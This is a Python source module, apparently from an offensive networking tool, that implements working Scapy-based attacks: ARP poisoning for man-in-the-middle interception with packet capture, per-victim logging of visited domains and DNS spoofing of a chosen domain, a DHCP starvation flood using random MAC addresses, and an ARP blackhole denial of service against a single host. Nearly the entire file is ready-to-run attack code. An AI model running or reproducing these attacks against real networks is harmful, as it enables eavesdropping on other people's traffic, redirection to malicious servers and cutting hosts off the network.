import threading
import time
import random
import os
from typing import Optional, Set, Any, List, Union
from scapy.all import sendp, sniff, conf, RandMAC, get_if_hwaddr, PcapWriter
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP, ICMP
from scapy.layers.l2 import ARP, Ether
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.utils import mac2str

from . import models
from .utils import get_mac_by_ip, get_gateway


class ArpPoisoning:
    """
    Implements ARP poisoning (Man-in-the-Middle) attack.
    """

    def __init__(self, target: models.Host, gateway: models.Host, iface: str, do_save: bool, 
                 spoofed_ip: Optional[str] = None, original_domain: Optional[str] = None) -> None:
        """
        Initializes the ArpPoisoning attack.
        :param target: The target Host object
        :param gateway: The gateway Host object
        :param iface: The network interface to use
        :param do_save: Whether to save captured traffic to a pcap file
        :param spoofed_ip: Optional IP address to use for DNS spoofing
        :param original_domain: Optional domain name to target for DNS spoofing
        :return: None
        """
        self.target: models.Host = target
        self.gateway: models.Host = gateway
        self.attacker_mac: str = get_if_hwaddr(iface)
        self.iface: str = iface
        self.is_running: bool = False
        self.__thread: Optional[threading.Thread] = None
        self.__sniff_thread: Optional[threading.Thread] = None
        self.do_save: bool = do_save
        self.pcap_writer: Optional[PcapWriter] = None
        self.original_domain: Optional[str] = original_domain
        self.spoofed_ip: Optional[str] = spoofed_ip
        self.visited_domains: Set[str] = set()  # track visited domains
        
        # Centralized path management
        self.hosts_dir: str = "hosts"
        self.current_host_dir: str = os.path.join(self.hosts_dir, self.target.ip_address)
        self.captures_dir: str = os.path.join(self.current_host_dir, "captures")
        self.visited_domains_file: str = os.path.join(self.current_host_dir, "visited_domains.txt")

        if self.do_save:
            try:
                if not os.path.exists(self.captures_dir):
                    os.makedirs(self.captures_dir)
                    
                #set filename based on timestamp
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                self.pcap_filename = os.path.join(self.captures_dir, f"arp_poison_{timestamp}.pcap")
                self.pcap_writer = PcapWriter(self.pcap_filename, append=True, sync=True)
            except Exception as e:
                print(f"Error initializing packet capture: {e}")
                self.do_save = False

    def poison_tables(self) -> None:
        """
        Sends spoofed ARP replies to both the target and the gateway,
        putting the attacker's machine in the middle of their communication.
        :return: None
        """

        arp_to_gateway = Ether(
            dst=self.gateway.mac_address,
            src=self.attacker_mac) / ARP(
            op=2,  # is-at
            pdst=self.gateway.ip_address,
            hwdst=self.gateway.mac_address,
            psrc=self.target.ip_address,
            hwsrc=self.attacker_mac
        )
        arp_to_target = Ether(
            dst=self.target.mac_address,
            src=self.attacker_mac) / ARP(
            op=2,  # is-at
            pdst=self.target.ip_address,
            hwdst=self.target.mac_address,
            psrc=self.gateway.ip_address,
            hwsrc=self.attacker_mac
        )
        sendp(arp_to_gateway, iface=self.iface, verbose=False)
        sendp(arp_to_target, iface=self.iface, verbose=False)

    def check_new_domain(self, qname: str) -> None:
        """
        Tracks newly visited domains and saves them to a file.
        :param qname: The domain name to check
        :return: None
        """
        if qname not in self.visited_domains:
            self.visited_domains.add(qname)
            #save visited domain to file
            try:
                with open(self.visited_domains_file, "a") as f:
                    f.write(qname + "\n")
            except Exception as e:
                print(f"Error saving visited domain: {e}")

    def is_dns(self, pkt: Any) -> bool:
        """
        Checks if a packet is a DNS query.
        :param pkt: The packet to check
        :return: True if it's a DNS query, False otherwise
        """
        return pkt.haslayer(DNS) and pkt.haslayer(DNSQR)

    def send_spoofed_dns(self, pkt: Any) -> bool:
        """
        Sends a spoofed DNS response for a specific domain.
        :param pkt: The original DNS query packet
        :return: True if a spoofed response was sent, False otherwise
        """
        if self.original_domain is None or self.spoofed_ip is None:
            return False
            
        qname = pkt[DNSQR].qname.decode()
        if self.original_domain not in qname:
            return False
        # Craft a DNS response with the spoofed IP
        dns_response = Ether(src=self.attacker_mac, dst=self.target.mac_address) \
                       / IP(src=pkt[IP].dst, dst=pkt[IP].src) \
                       / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) \
                       / DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                             an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=self.spoofed_ip))
        sendp(dns_response, iface=self.iface, verbose=False)
        return True

    def forward_packet(self, pkt: Any) -> None:
        """
        forwards packets between the target and the gateway, modifying the
        ethernet headers to ensure they are sent to the correct destination.
        :param pkt: The packet to forward
        :return: None
        """

        if not pkt.haslayer(IP):
            return

        # traffic from target to gateway
        if pkt[Ether].src == self.target.mac_address:
            if self.is_dns(pkt):
                if self.spoofed_ip and self.send_spoofed_dns(pkt):
                    return
                qname = pkt[DNSQR].qname.decode()
                #remove scapy's trailing dot from the domain name
                qname = qname[:-1] if qname.endswith(".") else qname
                self.check_new_domain(qname)
            pkt[Ether].src = self.attacker_mac
            pkt[Ether].dst = self.gateway.mac_address
            #save packet to pcap if enabled
            if self.do_save and self.pcap_writer:
                try:
                    self.pcap_writer.write(pkt)
                except Exception as e:
                    print(f"Error saving packet to capture: {e}")
            sendp(pkt, verbose=False, iface=self.iface)

        # traffic from gateway to target
        elif pkt[Ether].src == self.gateway.mac_address and pkt[IP].dst == self.target.ip_address:
            pkt[Ether].src = self.attacker_mac
            pkt[Ether].dst = self.target.mac_address
            if self.do_save and self.pcap_writer:
                try:
                    self.pcap_writer.write(pkt)
                except Exception as e:
                    print(f"Error saving packet to capture: {e}")
            sendp(pkt, verbose=False, iface=self.iface)

    def restore_tables(self) -> None:
        """
        Sends correct ARP replies to both the target and the gateway to restore their tables.
        :return: None
        """
        arp_to_gateway = Ether(
            dst=self.gateway.mac_address,
            src=self.attacker_mac
        ) / ARP(
            op=2,  # is-at
            pdst=self.gateway.ip_address,
            hwdst=self.gateway.mac_address,
            psrc=self.target.ip_address,
            hwsrc=self.target.mac_address
        )
        arp_to_target = Ether(
            dst=self.target.mac_address,
            src=self.attacker_mac
        ) / ARP(
            op=2,  # is-at
            pdst=self.target.ip_address,
            hwdst=self.target.mac_address,
            psrc=self.gateway.ip_address,
            hwsrc=self.gateway.mac_address
        )
        sendp(arp_to_gateway, iface=self.iface, verbose=False)
        sendp(arp_to_target, iface=self.iface, verbose=False)

    def start_sniffing(self) -> None:
        """
        sniffs traffic to forward it while the attack is running.
        :return: None
        """
        while self.is_running:
            sniff(iface=self.iface, prn=self.forward_packet, timeout=1, store=False)

    def poison(self) -> None:
        """
        Main loop that continuously sends ARP poison packets.
        :return: None
        """
        try:
            while self.is_running:
                self.poison_tables()
                time.sleep(2)
        except KeyboardInterrupt:
            print("Restoring ARP tables...")
            self.is_running = False
            self.restore_tables()

    def start(self) -> None:
        """
        Starts the ARP poisoning attack by launching separate threads for poisoning and sniffing.
        :return: None
        """
        self.is_running = True
        try:
            if not os.path.exists(self.hosts_dir):
                os.makedirs(self.hosts_dir)
            if not os.path.exists(self.current_host_dir):
                os.makedirs(self.current_host_dir)
                
            #load visited domains for this host if exists
            if os.path.exists(self.visited_domains_file):
                with open(self.visited_domains_file, "r") as f:
                    self.visited_domains = set(line.strip() for line in f)
            else:
                #create empty file to track visited domains
                with open(self.visited_domains_file, "w") as f:
                    pass
        except Exception as e:
            print(f"Error creating/opening directories for packet capture: {e}")
        # poisoning thread
        self.__thread = threading.Thread(target=self.poison)
        self.__thread.start()

        # forwarding thread
        self.__sniff_thread = threading.Thread(target=self.start_sniffing)
        self.__sniff_thread.start()

        print("Starting ARP poisoning and forwarding...")

    def stop(self) -> None:
        """
        Stops the ARP poisoning attack and restores ARP tables.
        :return: None
        """
        self.is_running = False

        # stop threads and restore tables
        if self.__thread is not None:
            self.__thread.join()

        if self.__sniff_thread is not None:
            self.__sniff_thread.join()

        self.restore_tables()

        if self.do_save and self.pcap_writer:
            try:
                self.pcap_writer.close()
            except Exception as e:
                print(f"Error closing packet capture: {e}")
        print("ARP poisoning stopped, ARP tables restored.")


class DHCPStarvation:
    """
    Implements a DHCP starvation attack.
    """

    def __init__(self, *, iface: str) -> None:
        """
        Initializes the DHCPStarvation attack.
        :param iface: The network interface to use
        :return: None
        """
        self.__thread: Optional[threading.Thread] = None
        self.iface: str = iface
        self.is_running: bool = False

    def dhcp_starve_attack(self) -> None:
        """
        Main loop that continuously sends DHCP Discover packets with random MAC addresses.
        :return: None
        """
        # packet template with static fields
        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") \
                        / IP(src="0.0.0.0", dst="255.255.255.255") \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=1) \
                        / DHCP(options=[("message-type", "discover"), "end"])
        
        while self.is_running:
            # update randomized fields
            random_mac = str(RandMAC())
            dhcp_discover[Ether].src = random_mac
            dhcp_discover[BOOTP].chaddr = mac2str(random_mac)
            dhcp_discover[BOOTP].xid = random.randint(0, 0xFFFFFFFF)

            sendp(dhcp_discover, iface=self.iface, verbose=False)

    def start(self) -> None:
        """
        Starts the DHCP starvation attack in a separate thread.
        :return: None
        """
        self.is_running = True
        conf.checkIPaddr = False
        self.__thread = threading.Thread(target=self.dhcp_starve_attack)
        self.__thread.start()

    def stop(self) -> None:
        """
        Stops the DHCP starvation attack.
        :return: None
        """
        self.is_running = False
        conf.checkIPaddr = True
        if self.__thread is not None:
            self.__thread.join()


class SingleTargetDos:
    """
    Implements a Denial of Service attack against a single target using ARP poisoning.
    """

    def __init__(self, target: models.Host, gateway_ip: str, gateway_mac: str, iface: str) -> None:
        """
        Initializes the SingleTargetDos attack.
        :param target: The target Host object
        :param gateway_ip: The gateway's IP address
        :param gateway_mac: The gateway's MAC address
        :param iface: The network interface to use
        :return: None
        """
        self.target_ip: str = target.ip_address
        self.target_mac: str = target.mac_address
        self.attacker_mac: str = get_if_hwaddr(iface)
        self.gateway_ip: str = gateway_ip
        self.gateway_mac: str = gateway_mac
        self.iface: str = iface
        self.is_running: bool = False
        self.__thread: Optional[threading.Thread] = None
        
        # Distinct Dummy MACs for each side of the attack
        self.dummy_target_mac: str = "de:ad:be:ef:00:01"
        self.dummy_gateway_mac: str = "de:ad:be:ef:00:02"

    def send_poison_packets(self) -> None:
        """
        Poison both target and gateway using distinct dummy MACs to create a blackhole.
        :return: None
        """
        # 1. Tell Target that Gateway is at dummy MAC (Blackhole Outbound)
        poison_target = Ether(dst=self.target_mac, src=self.attacker_mac) / ARP(
            op=2,
            psrc=self.gateway_ip,
            hwsrc=self.dummy_gateway_mac,
            pdst=self.target_ip,
            hwdst=self.target_mac
        )
        
        # 2. Tell Gateway that Target is at dummy MAC (Blackhole Inbound)
        poison_gateway = Ether(dst=self.gateway_mac, src=self.attacker_mac) / ARP(
            op=2,
            psrc=self.target_ip,
            hwsrc=self.dummy_target_mac,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac
        )
        
        sendp([poison_target, poison_gateway], iface=self.iface, verbose=False)

    def restore_tables(self) -> None:
        """
        Restores ARP tables for both sides surgically.
        :return: None
        """
        restore_target = Ether(dst=self.target_mac, src=self.attacker_mac) / ARP(
            op=2,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac,
            pdst=self.target_ip,
            hwdst=self.target_mac
        )
        restore_gateway = Ether(dst=self.gateway_mac, src=self.attacker_mac) / ARP(
            op=2,
            psrc=self.target_ip,
            hwsrc=self.target_mac,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac
        )
        sendp([restore_target, restore_gateway], iface=self.iface, verbose=False, count=3)

    def poison_loop(self) -> None:
        """
        Main loop that continuously sends poison packets.
        :return: None
        """
        while self.is_running:
            self.send_poison_packets()
            time.sleep(0.2)

    def start(self) -> None:
        """
        Starts the DoS attack in a separate thread.
        :return: None
        """
        self.is_running = True
        self.__thread = threading.Thread(target=self.poison_loop)
        self.__thread.start()

    def stop(self) -> None:
        """
        Stops the DoS attack and restores ARP tables.
        :return: None
        """
        self.is_running = False
        if self.__thread is not None:
            self.__thread.join()
        self.restore_tables()
